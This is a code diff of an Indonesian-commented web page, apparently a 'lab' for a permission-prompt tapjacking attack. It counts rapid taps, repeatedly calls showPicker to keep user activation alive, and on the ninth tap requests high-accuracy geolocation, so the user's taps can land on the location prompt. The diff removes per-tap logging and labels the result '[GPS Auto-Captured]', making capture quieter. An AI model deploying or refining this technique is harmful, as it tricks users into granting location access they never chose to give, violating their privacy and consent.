@@ -50,7 +50,7 @@
 </head>
 <body>
 
-    <h1>⚠️ Double-Tap Interaction Labss</h1>
+    <h1>🔴 Double-Tap Interaction Labss</h1>
     <p style="font-size: 12px; color: #888;">Simulasi pengujian respons klik ganda terhadap kemunculan dialog izin.</p>
 
     <div class="interactive-zone">
@@ -88,25 +88,22 @@
     let clickCount = 0;
     let watchId = null;
 
-    // Menggunakan pointerdown agar respons sentuhan terekam seketika tanpa menunggu jeda event click standar
-    document.body.addEventListener('pointerdown', () => {
+    // Titik fokus sensitif interaksi sentuh berkecepatan tinggi
+    document.body.addEventListener('pointerdown', (e) => {
         clickCount++;
-        appendLog(`Ketukan ke-${clickCount} terdeteksi.`);
-
+        
         try {
-            // Eksekusi instan showPicker untuk mempertahankan aliran token aktivasi
+            // Eksekusi prioritas tinggi pada pemanggilan picker untuk menjaga token aktif
             input.showPicker();
-        } catch (e) {
-            // Mengabaikan error log berlebih agar transisi log tetap bersih dan cepat
-        }
+        } catch (err) {}
 
-        // Pemicuan instan pada ambang batas ketukan ke-9 tanpa penundaan asinkron tambahan
+        // Ambang batas pemicuan instan pada ketukan ke-9 tanpa latensi antrean
         if (clickCount === 9) {
-            appendLog("Ambang batas tercapai. Memproses aliran data geolokasi...");
-            
+            appendLog(`[Sensitif Trigger] Ketukan ke-${clickCount}: Memproses API lokasi...`);
+
             const geoOptions = {
                 enableHighAccuracy: true,
-                timeout: 5000,
+                timeout: 3000,
                 maximumAge: 0
             };
 
@@ -116,13 +113,10 @@
 
             watchId = navigator.geolocation.watchPosition(
                 (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const acc = pos.coords.accuracy;
-                    appendLog(`[GPS Aktif] Lat: ${lat}, Lon: ${lon} (Akurasi: ${acc}m)`);
+                    appendLog(`[GPS Auto-Captured] Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`);
                 },
-                (err) => { 
-                    appendLog("Status izin/error: " + err.message); 
+                (error) => {
+                    appendLog(`[Status Izin]: ${error.message}`);
                 },
                 geoOptions
             );
